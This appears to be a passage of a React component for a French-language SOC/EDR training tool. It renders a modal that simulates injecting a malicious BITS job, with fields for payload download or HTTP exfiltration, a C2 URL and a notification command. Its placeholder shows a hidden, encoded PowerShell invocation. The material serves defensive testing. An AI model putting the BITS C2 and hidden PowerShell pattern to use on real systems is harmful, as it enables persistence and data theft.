      {/* Modal to simulate adding a malicious C2 BITS Task */}
      {isSimulateModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
          <div className="bg-slate-900 border border-slate-800 rounded-xl max-w-lg w-full p-6 space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Radio className="w-4 h-4 text-cyan-400" />
                <span>Simuler une Tâche BITS (Test SOC & EDR)</span>
              </h3>
              <button
                onClick={() => setIsSimulateModalOpen(false)}
                className="text-slate-400 hover:text-slate-200 text-sm"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed font-sans">
              Injectez une tâche de test pour vérifier la réaction de l'analyste, la détection des transferts furtifs et la procédure d'éradication sans impacter le système d'exploitation.
            </p>

            <div className="space-y-3 text-xs font-mono">
              <div>
                <label className="text-slate-300 block mb-1">Nom de la Tâche :</label>
                <input
                  type="text"
                  value={newJobName}
                  onChange={e => setNewJobName(e.target.value)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Direction :</label>
                <select
                  value={newDirection}
                  onChange={e => setNewDirection(e.target.value as any)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-slate-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="DOWNLOAD">DOWNLOAD (Téléchargement de Payload)</option>
                  <option value="UPLOAD_EXFIL">UPLOAD_EXFIL (Exfiltration HTTP POST)</option>
                </select>
              </div>

              <div>
                <label className="text-slate-300 block mb-1">URL Distante (C2 / Serveur Attaquant) :</label>
                <input
                  type="text"
                  value={newRemoteUrl}
                  onChange={e => setNewRemoteUrl(e.target.value)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Chemin Local (Cible Windows) :</label>
                <input
                  type="text"
                  value={newLocalPath}
                  onChange={e => setNewLocalPath(e.target.value)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Notification Command Line (-SetNotifyCmdLine) :</label>
                <input
                  type="text"
                  value={newNotifyCmd}
                  onChange={e => setNewNotifyCmd(e.target.value)}
                  placeholder="Ex: powershell.exe -w hidden -enc ..."
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>
            </div>

            <div className="flex items-center justify-end gap-2 pt-3 border-t border-slate-800">
              <button
                onClick={() => setIsSimulateModalOpen(false)}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-xs font-semibold"
              >
                Annuler
              </button>
              <button
                onClick={handleAddSimulatedTask}
                className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white rounded-lg text-xs font-bold shadow-md shadow-cyan-900/40"
              >
                Injecter la Tâche de Test
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
